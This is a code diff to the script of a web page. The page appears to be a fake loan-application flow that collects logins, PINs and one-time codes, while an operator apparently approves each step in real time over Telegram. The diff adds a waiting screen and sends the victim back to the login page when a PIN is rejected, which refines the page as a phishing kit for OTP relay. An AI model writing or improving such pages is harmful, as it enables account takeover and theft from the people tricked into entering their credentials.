-    document.getElementById('btnOtp').disabled = true;
 
     try {
       const res = await fetch('/api/verify-code', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId, code: otp })
       });
-      if (res.ok) startPolling('page4'); 
+      if (res.ok) startPolling(); 
     } catch (err) {
       document.getElementById('errOtp').textContent = 'Connection error.';
       document.getElementById('errOtp').style.display = 'block';
-      document.getElementById('btnOtp').disabled = false;
     }
   }
 
-  // --- POLLING LOGIC (Waiting for Telegram) ---
-  function startPolling(currentPage) {
+  function startPolling() {
     if (isPolling) return;
     isPolling = true;
-
-    // Hide form and show a simple loading state on the buttons
-    const btn = currentPage === 'page3' ? document.getElementById('btnLogin') : document.getElementById('btnOtp');
-    if(btn) btn.textContent = 'Processing...';
+    showPage('page-waiting'); 
 
     pollTimer = setInterval(async () => {
       try {
@@ -524,30 +572,32 @@
 
         if (status === 'approved_4') {
           stopPolling();
-          showPage('page3'); // Approved Page 2, go to Page 3
+          showPage('page3');
         } 
         else if (status === 'rejected_4') {
           stopPolling();
           alert('Your application was rejected. Please try again.');
           showPage('page2');
+          document.getElementById('formQuestionnaire').querySelector('button').disabled = false;
         } 
         else if (status === 'approved_all') {
           stopPolling();
-          // Populate the phone number on the OTP screen
           const phone = document.getElementById('pPhone').value;
           document.getElementById('otpPhoneDisplay').textContent = '+263 ' + phone;
-          showPage('page4'); // Approved Page 3, go to Page 4
+          showPage('page4');
         } 
         else if (status === 'completed') {
           stopPolling();
-          showPage('page5'); // Approved OTP, Success!
+          showPage('page5');
         } 
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert('The Admin rejected your OTP. Please try again.');
+          alert('The Admin rejected your PIN/OTP. Please try again.');
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
+          document.querySelectorAll('#pinContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
-          showPage('page4');
+          // Since PIN might be rejected, we send them back to the Login screen
+          showPage('page3');
         }
       } catch (err) { console.error(err); }
     }, 3000);
@@ -559,13 +609,11 @@
     isPolling = false;
   }
 
-  // Start Timer for OTP Resend
   setInterval(() => {
     const t = document.getElementById('timer');
     if(t && parseInt(t.textContent) > 0) t.textContent = parseInt(t.textContent) - 1;
   }, 1000);
 
-  // Initialize calculator on load
   updateCalc();
 </script>
 </body>
